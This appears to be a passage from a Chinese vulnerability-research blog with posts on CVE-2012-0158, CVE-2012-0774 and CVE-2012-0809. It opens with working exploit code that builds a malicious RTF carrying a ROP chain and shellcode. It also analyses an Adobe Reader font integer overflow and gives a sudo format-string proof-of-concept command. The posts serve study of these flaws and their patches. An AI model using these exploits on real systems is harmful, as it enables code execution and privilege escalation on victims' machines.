makes ECX point to nearly offset of Stack.            0x3F2B745E, # MOV ECX,DWORD PTR DS:[EAX] #RETN            0x3F39795E, # POP EDX # RETN            0x00000024, # pop 0x00000024 into EDX            # add 0x24 to ECX ( Stack address )            0x3F39CB44, # ADD ECX,EDX # ADD EAX,ECX # POP ESI # RETN            junk,            # EAX = ECX            0x3F398267, # MOV EAX,ECX # RETN            # mov EAX ( Stack Address + 24 = Current ESP value ) into the current Stack Location,            # and the popping it into ESI ! now ESI point where shellcode stores in stack            0x3F3A16DE, # MOV DWORD PTR DS:[ECX],EAX # XOR EAX,EAX # POP ESI # RETN            # EAX = ECX            0x3F398267, # MOV EAX,ECX # RETN            0x3F2CB9E0, # POP ECX # RETN            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX            # makes EAX point to our RWX Heap            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN            # makes EDI = Our RWX Heap Address            0x3F2B0A7C, # XCHG EAX,EDI # RETN 4            0x3F2CB9E0, # POP ECX # RETN            junk,            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX            # makes EAX point to our RWX Heap            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN            # just skip some junks            0x3F38BEFB, # ADD AL,58 # RETN            0x3F2CB9E0, # POP ECX # RETN            0x00000300, # pop 0x00000300 into ECX ( 0x300 * 4 = Copy lent )            # Copy shellcode from stack into RWX Heap            0x3F3441B4, # REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] # POP EDI # POP ESI # RETN            junk(2), # pop into edi # pop into esi            0x3F39AFCF # CALL EAX # RETN        ].flatten.pack(&quot;V*&quot;)        # To avoid shellcode being corrupted in the stack before ret        rop_gadgets &lt;&lt; &quot;\\x90&quot; * target[&#x27;RopOffset&#x27;] # make_nops doesn&#x27;t have sense here        return rop_gadgets    end    def exploit        #* 目标系统的返回地址，例如魔法跳转地址 0x7FFA4512        ret_address = stream([target.ret].pack(&quot;V&quot;))        #* 创建 shellcode        if target[&#x27;Rop&#x27;]            shellcode = stream(create_rop_chain)        else            # To avoid shellcode being corrupted in the stack before ret            shellcode = stream(make_nops(target[&#x27;Offset&#x27;]))            shellcode &lt;&lt; stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, &quot;jmp $+6&quot;).encode_string)            shellcode &lt;&lt; stream(make_nops(4))        end        shellcode &lt;&lt; stream(payload.encoded)        while shellcode.length &lt; 2378            shellcode += &quot;0&quot;        end        #* 构造 RTF 文件        content = &quot;&#123;\\\\rtf1&quot;        content &lt;&lt; &quot;&#123;\\\\fonttbl&#123;\\\\f0\\\\fnil\\\\fcharset0 Verdana;&#125;&#125;&quot;        content &lt;&lt; &quot;\\\\viewkind4\\\\uc1\\\\pard\\\\sb100\\\\sa100\\\\lang9\\\\f0\\\\fs22\\\\par&quot;        content &lt;&lt; &quot;\\\\pard\\\\sa200\\\\sl276\\\\slmult1\\\\lang9\\\\fs22\\\\par&quot;        #* 嵌入 OCX 空间        content &lt;&lt; &quot;&#123;\\\\object\\\\objocx&quot;        content &lt;&lt; &quot;&#123;\\\\*\\\\objdata&quot;        content &lt;&lt; &quot;\\n&quot;        content &lt;&lt; &quot;01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000&quot;        content &lt;&lt; &quot;00000000000000000E0000&quot;        content &lt;&lt; &quot;\\n&quot;        content &lt;&lt; &quot;D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000&quot;        content &lt;&lt; &quot;00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF&quot;        content &lt;&lt; &quot;FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400&quot;        content &lt;&lt; &quot;72007900000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628&quot;        content &lt;&lt; &quot;0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00&quot;        content &lt;&lt; &quot;49006E0066006F000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000600000000000000&quot;        content &lt;&lt; &quot;03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000001000000&quot;        content &lt;&lt; &quot;160000000000000043006F006E00740065006E007400730000000000000000000000000000000000&quot;        content &lt;&lt; &quot;000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000&quot;        content &lt;&lt; &quot;0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000&quot;        content &lt;&lt; &quot;11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;        content &lt;&lt; &quot;FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000004C00690073007400&quot;        content &lt;&lt; &quot;56006900650077004100000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600&quot;        content &lt;&lt; &quot;1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080&quot;        content &lt;&lt; &quot;05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974&quot;        content &lt;&lt; &quot;6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000&quot;        content &lt;&lt; &quot;000000000000&quot;        #* 将 shellcode 与返回地址包含在 RTF 文件中        content &lt;&lt; ret_address        content &lt;&lt; &quot;9090909090909090&quot;        content &lt;&lt; shellcode        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;        content &lt;&lt; &quot;00000000000000&quot;        content &lt;&lt; &quot;\\n&quot;        content &lt;&lt; &quot;&#125;&quot;        content &lt;&lt; &quot;&#125;&quot;        content &lt;&lt; &quot;&#125;&quot;        print_status(&quot;Creating &#x27;#&#123;datastore[&#x27;FILENAME&#x27;]&#125;&#x27; file ...&quot;)        file_create(content)    endend\n\n该 exp 的利用思路经典而简单明了————生成一个嵌入了恶意 MSComctlLib.ListViewCtrl.2 控件的 RTF 文件，其中控件被插入了 shellcode————在此就不过多赘述\n漏洞修复补丁后的程序在内存复制前的判断条件修改如下：\n\nv7(前四个字节) &#x3D;&#x3D; Cobj\ndwVersion &#x3D;&#x3D; 0x64\ndwBytes &#x3D;&#x3D; 8\n\n全部满足方可接着执行加载方法\nReferenceCVE-2012-0158 An Anatomy of a Prolific ExploitNVD - CVE-2012-0158CVE - CVE-2012-0158Github - CVE-2012-0158漏洞战争看雪论坛精华帖吾爱破解精华帖永远的经典：CVE-2012-0158漏洞分析、利用、检测和总结\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-0774 漏洞研究","url":"/2024/11/11/Vulnerability%20Investigation/CVE-2012-0774-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"CVE-2012-0774 的漏洞通报和《漏洞战争》对该漏洞的描述都仅指出了这是一个整数溢出漏洞，没有更多关于漏洞成因的信息\n\nInteger overflow in Adobe Reader and Acrobat 9.x before 9.5.1 and 10.x before 10.1.3 allows attackers to execute arbitrary code via a crafted TrueType font.Adobe Reader 和 Adobe Acrobat 9.5.2 之前的 9.x 版本和 10.1.13 之前的 10.x 版本中存在整数溢出漏洞，攻击者可利用该漏洞借助特制的 TrueType 字体执行任意代码\n\n经分析，CVE-2012-0774 的成因为 Adobe Reader 的 TTF 渲染器在对 TTF 中的 MINDEX 图元指令进行解释执行时，会基于从 glyf 图元数据表中读取的索引值计算解释器虚拟机的堆栈的位偏移值，却未对计算出的位偏移值进行整数溢出的检测。索引值将作为后续内存复制的循环次数，位偏移值将作为该内存复制的起点。当索引值较大使得位偏移值的计算发生整数溢出时，内存复制的起点会向高地址方向偏移，而内存复制的循环次数或者说内存复制的数据数量不会发生改变，程序发生溢出，进而导致 RCE\n影响范围:\nAdobe Reader 9.x , x &lt; 5.2Adobe Acrobat 9.x , x &lt; 5.2Adobe Acrobat 10.x , x &lt; 1.3\n\n\nTTF 图元指令TTF 中有几个片段负责格式化存储字体字形的描述，其中一个片段是字节码语言，即图元指令，主要位于用于存放图元轮廓定义以及网格调整指令的图元数据表 glyf 中。图元指令由 TTF 渲染器中的一个解释器执行。这个解释器是一个基于堆栈的虚拟机。\n每个图元的头结构如下\ntypedef   struct     &#123;       WORD   numberOfContours;  // 轮廓数目，复合图元时为负数      FWord   xMin;             // X坐标最小值.       FWord   yMin;             // Y坐标最小值      FWord   xMax;             // X坐标最大值       FWord   yMax;             // Y坐标最大值   &#125; GlyphHeader;\n\n在头结构之后是一些关于图元的描述信息：\nUSHORT   endPtsOfContours[n];   // 轮廓线上点的数量,n为轮线条娄   USHORT   instructionlength;     // 图元指令长度BYTE   instruction[i];          // 字体虚拟机指令数组   BYTE   flags[];                 // 标志数组   BYTE   xCoordinates[];          // X坐标数据   BYTE   yCoordinates[];          // Y坐标数据\n\n漏洞分析调试运行 Adobe Reader 并打开样本，程序因触发 Access Violation 异常而中断，异常触发原因为程序试图向只读地址写入数据。根据调试信息得到 Crash Point 位于 CoolType.dll 中，栈回溯确认崩溃函数为 sub_8007E48 函数，使用 IDA 打开 CoolType.dll 并定位到 sub_8007E48 函数，其反汇编代码为\n.text:08007E48.text:08007E48                               ; =============== S U B R O U T I N E =======================================.text:08007E48.text:08007E48.text:08007E48                               ; int __cdecl sub_8007E48(int).text:08007E48                               sub_8007E48 proc near                   ; CODE XREF: .text:08006DFE↑p.text:08007E48                                                                       ; sub_807B0EF+48↓p.text:08007E48                                                                       ; DATA XREF: .data:funcs_807B137↓o.text:08007E48.text:08007E48                               arg_0= dword ptr  4.text:08007E48.text:08007E48 A1 30 27 27 08                mov     eax, dword_8272730.text:08007E4D 8B 0D 3C 27 27 08             mov     ecx, dword_827273C.text:08007E53 53                            push    ebx.text:08007E54 56                            push    esi.text:08007E55 8B 31                         mov     esi, [ecx].text:08007E57 8D 50 FC                      lea     edx, [eax-4].text:08007E5A 57                            push    edi.text:08007E5B 3B D6                         cmp     edx, esi.text:08007E5D 72 45                         jb      short loc_8007EA4.text:08007E5D.text:08007E5F 8B B9 54 01 00 00             mov     edi, [ecx+154h].text:08007E65 3B D7                         cmp     edx, edi.text:08007E67 73 3B                         jnb     short loc_8007EA4.text:08007E67.text:08007E69 83 C0 FC                      add     eax, 0FFFFFFFCh.text:08007E6C 8B 10                         mov     edx, [eax].text:08007E6E 8B DA                         mov     ebx, edx.text:08007E70 C1 E3 02                      shl     ebx, 2.text:08007E73 8B C8                         mov     ecx, eax.text:08007E75 2B CB                         sub     ecx, ebx.text:08007E77 3B CE                         cmp     ecx, esi.text:08007E79 72 29                         jb      short loc_8007EA4.text:08007E79.text:08007E7B 3B CF                         cmp     ecx, edi.text:08007E7D 73 25                         jnb     short loc_8007EA4.text:08007E7D.text:08007E7F 8B 39                         mov     edi, [ecx].text:08007E81 85 D2                         test    edx, edx.text:08007E83 7E 0F                         jle     short loc_8007E94.text:08007E83.text:08007E85.text:08007E85                               loc_8007E85:                            ; CODE XREF: sub_8007E48+47↓j.text:08007E85 4A                            dec     edx.text:08007E86 8D 71 04                      lea     esi, [ecx+4].text:08007E89 8B 1E                         mov     ebx, [esi].text:08007E8B 89 19                         mov     [ecx], ebx //! Crash Point.text:08007E8D 8B CE                         mov     ecx, esi.text:08007E8F 75 F4                         jnz     short loc_8007E85.text:08007E8F.text:08007E91 83 E8 04                      sub     eax, 4.text:08007E91.text:08007E94.text:08007E94                               loc_8007E94:                            ; CODE XREF: sub_8007E48+3B↑j.text:08007E94 89 38                         mov     [eax], edi.text:08007E96 83 C0 04                      add     eax, 4.text:08007E99 A3 30 27 27 08                mov     dword_8272730, eax.text:08007E9E 8B 44 24 10                   mov     eax, [esp+0Ch+arg_0].text:08007EA2 EB 0F                         jmp     short loc_8007EB3.text:08007EA2.text:08007EA4                               ; ---------------------------------------------------------------------------.text:08007EA4.text:08007EA4                               loc_8007EA4:                            ; CODE XREF: sub_8007E48+15↑j.text:08007EA4                                                                       ; sub_8007E48+1F↑j.text:08007EA4                                                                       ; sub_8007E48+31↑j.text:08007EA4                                                                       ; sub_8007E48+35↑j.text:08007EA4 A1 88 27 27 08                mov     eax, dword_8272788.text:08007EA9 C7 05 84 27 27 08 10 11 00 00 mov     dword_8272784, 1110h.text:08007EA9.text:08007EB3.text:08007EB3                               loc_8007EB3:                            ; CODE XREF: sub_8007E48+5A↑j.text:08007EB3 5F                            pop     edi.text:08007EB4 5E                            pop     esi.text:08007EB5 5B                            pop     ebx.text:08007EB6 C3                            retn.text:08007EB6.text:08007EB6                               sub_8007E48 endp\n\n其反编译代码为\nint __cdecl sub_8007E48(int a1)&#123;  unsigned int v1; // edi  _DWORD *v2; // eax  int v3; // edx  int *v4; // ecx  int v5; // edi  int result; // eax  if ( (unsigned int)(dword_8272730 - 4) &lt; *(_DWORD *)dword_827273C    || (v1 = *(_DWORD *)(dword_827273C + 0x154), dword_8272730 - 4 &gt;= v1)    || (v2 = (_DWORD *)(dword_8272730 - 4),        v3 = *(_DWORD *)(dword_8272730 - 4),        v4 = (int *)(dword_8272730 - 4 - 4 * v3),        (unsigned int)v4 &lt; *(_DWORD *)dword_827273C)    || (unsigned int)v4 &gt;= v1 )  &#123;    result = dword_8272788;    dword_8272784 = 0x1110;  &#125;  else  &#123;    v5 = *v4;    if ( v3 &gt; 0 )    &#123;      do      &#123;        --v3;        *v4 = v4[1]; //! Crash Point        ++v4;      &#125;      while ( v3 );      --v2;    &#125;    *v2 = v5;    dword_8272730 = (int)(v2 + 1);    return a1;  &#125;  return result;&#125;\n\n为方便阅读,变量重命名后的漏洞函数反编译代码为\nint __cdecl vulFunction(int a1)&#123;  unsigned int high; // edi  _DWORD *end; // eax  int len; // edx  int *start; // ecx  int top; // edi  int result; // eax  if ( (unsigned int)(a - 4) &lt; *(_DWORD *)b    || (high = *(_DWORD *)(b + 0x154), a - 4 &gt;= high)    || (end = (_DWORD *)(a - 4),        len = *(_DWORD *)(a - 4),        start = (int *)(a - 4 - 4 * len),        (unsigned int)start &lt; *(_DWORD *)b)    || (unsigned int)start &gt;= high )  &#123;    result = dword_8272788;    dword_8272784 = 0x1110;  &#125;  else  &#123;    top = *start;    if ( len &gt; 0 )    &#123;      do      &#123;        --len;        *start = start[1]; //! Crash Point        ++start;      &#125;      while ( len );      --end;    &#125;    *end = top;    a = (int)(end + 1);    return a1;  &#125;  return result;&#125;\n\n使用 LLM 辅助阅读了一下这段代码，其功能为对一个范围的数据进行循环前移，具体来说内存中从 a - 4 - 4 * len 到 a - 4 的每个 dword 都将往低地址移动 4 字节，其中 len 为内存中 a - 4 处指向的值\n静态分析能够发现 4 * len 的计算结果没有进行整数溢出检验。通过调试进行动态分析时则能够发现，在处理样本时，len 的值被读取为 0x40000001，而在乘以 4 之后寄存器中保存的运算结果变成了 0x00000004，因此接下来内存复制的起点将会往高地址偏移 0x40000001 - 0x00000004，然后依旧进行 0x40000001 个数据的循环前移，导致溢出而触发 Access Violation\n查看 vulFunction 的交叉引用能够发现该函数位于一个函数数组中，该函数数组通过 ecx 作为偏移量跳转到对应函数，在该处下条件记录断点，发现崩溃时此处的 ecx 为 0x26。由于漏洞是由 TTF 文件触发的，在样本中搜索 0x26 发现它出现在 glyf 表中，推测其为图元指令\n\n针对 0x26 其实是图元指令的分析说实话非常玄学。漏洞战争通过一个非常小众且现在已经不再找得到的工具分析样本时发现 TTF 文件解析出错而判断问题出现在样本的 glyf 表中，并结合文档和此时发现的函数数组猜测出了 0x26 应该是图元指令；LarryS 师傅查看了 len 变量附近的数据块发现了有些他觉得很异常的 0x41 并怀疑这些数据是人为设置的因而在样本中搜索了 0x41 然后发现这些 0x41 都出现在 glyf 表中并对 0x41 所处的最后一个 SimpleGlyph 中的所有指令进行了逆向发现了 vulFunction 是 0x26 图元指令。我个人也没有什么比较好的思路，因此在这里只能采取这种有些从结果推过程的做法进行分析\n\n结合 TTF 文档可得知 0x26 对应图元指令 MINDEX。MINDEX 指令可以从栈中弹出一个值 index，并利用这个值作为一个索引进入栈区。index 处的值被移到栈顶，栈中原有的值依次向下移动以填补移动产生的空间。由于所有的栈操作都以 4 字节为单位，Adobe Reader 的解释器会对索引值乘以 4 以得到需要进行的偏移值。可以发现该指令的功能确实与 vulFunction 一致。由于没有对这个乘法运算进行整数溢出的检测，如果 0x40000001 &lt;&#x3D; index &lt;&#x3D; 0x7fffffff ，程序将发生溢出\n样本中的 0x40000001 为 glyf 表中最后一个 SimpleGlyph 中写入的指令经过一系列运算得出，这点可以根据 len 的动态污点分析证实，属于是纯体力活，在此不过多赘述\n漏洞利用该漏洞尚未发现通用的漏洞利用方式，令人感慨\n漏洞修复Patch 后的 VulFunction 会对虚拟栈上数据差值和 0xFFFFFFFC 相与后的值进行检测，以防止整数溢出\nReferenceNVD - CVE-2012-0774CVE - CVE-2012-0774Adobe - APSB12-08：Prenotification Security Advisory for Adobe Reader and AcrobatGithub - CVE-2012-0774漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-0809 漏洞研究","url":"/2025/01/01/Vulnerability%20Investigation/CVE-2012-0809%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"sudo 1.8.0 到 1.8.3p1 的 sudo_debug 函数存在格式化字符串漏洞，攻击者拿到靶机的本地用户权限后可借此漏洞进行提权\n影响范围\nsudo 1.8.0, 1.8.1, 1.8.1p1, 1.8.1p2, 1.8.2, 1.8.3, 1.8.3p1\n\n\n漏洞分析sudo 程序是开源的，我们可以通过漏洞公告前后的源码比对定位到漏洞的位置，下以 1.8.3p1 与 1.8.3p2 的源码为例\n1.8.3p1\n/* * Simple debugging/logging. */voidsudo_debug(int level, const char *fmt, ...)&#123;    va_list ap;    char *fmt2;    if (level &gt; debug_level)\treturn;    /* Backet fmt with program name and a newline to make it a single write */    easprintf(&amp;fmt2, &quot;%s: %s\\n&quot;, getprogname(), fmt); //！ vul    va_start(ap, fmt);    vfprintf(stderr, fmt2, ap);    va_end(ap);    efree(fmt2);&#125;\n\n1.8.3p2\n/* * Simple debugging/logging. */voidsudo_debug(int level, const char *fmt, ...)&#123;    va_list ap;    char *buf;    if (level &gt; debug_level)\treturn;    /* Bracket fmt with program name and a newline to make it a single write */    va_start(ap, fmt);    evasprintf(&amp;buf, fmt, ap);    va_end(ap);    fprintf(stderr, &quot;%s: %s\\n&quot;, getprogname(), buf);    efree(buf);&#125;\n\n注意到低版本中地这两行\neasprintf(&amp;fmt2, &quot;%s: %s\\n&quot;, getprogname(), fmt); //！ vulvfprintf(stderr, fmt2, ap);\n\n结合函数名可推断 getprogname 函数的返回值是用户可控的，它将被 easprintf 函数写入到 fmt2 变量中，并在 vfprintf 中作为格式化控制字符串输出到 stderr。若程序名包含了格式化控制字符串的相关关键字，就会导致格式化字符串漏洞\n这样的漏洞成因和利用方式实在是让了解 SQL 注入等代码注入技术的人倍感亲切啊\n漏洞利用编译安装 sudo 1.8.2 后执行\nln -s /usr/local/bin/sudo %n./%n -D9\n\n出现\nSegmentation fault\n\n漏洞验证成功，再通过构造格式化控制字符串控制偏移量即可实现任意读任意写进而提权，详见国外安全研究院撰写的 Exploiting Sudo format string vunerability : VNSECURITY &#x2F; CLGT TEAM\n漏洞修复在漏洞分析的源码比对中能看到修复后的版本直接使用了 %s: %s\\n 